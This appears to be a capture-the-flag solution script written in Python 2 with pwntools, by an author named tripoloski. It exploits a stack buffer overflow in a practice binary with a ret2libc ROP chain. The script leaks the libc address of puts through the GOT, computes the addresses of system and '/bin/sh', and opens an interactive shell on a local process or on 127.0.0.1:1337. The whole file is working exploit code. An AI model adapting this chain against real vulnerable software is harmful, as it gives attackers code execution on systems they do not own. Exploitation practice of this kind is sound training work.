#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/ctf/git/satsiber-tniad/rop/ret2libc/a.out")
elf = ELF(TARGET)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    attach(r)
    poprdi = 0x00000000004011f3
    puts = 0x000000000401050
    puts_got = 0x404018
    main = 0x401156
    ret = 0x000000000040101a

    p = "A" * 23
    p += p64(poprdi)
    p += p64(puts_got)
    p += p64(ret)
    p += p64(puts)
    p += p64(main)
    r.sendlineafter("input:\n",p)
    leak = u64(r.recv(6).ljust(8, "\x00"))
    log.info('leak: ' + hex(leak))

    base = leak - libc.sym['puts']
    sys = base + libc.sym['system']
    binsh = base + libc.search("/bin/sh").next()

    p = "A" * 23
    p += p64(poprdi)
    p += p64(binsh)
    p += p64(sys)
    p += p64(ret)
    r.sendlineafter("input:\n",p)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("127.0.0.1", 1337)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
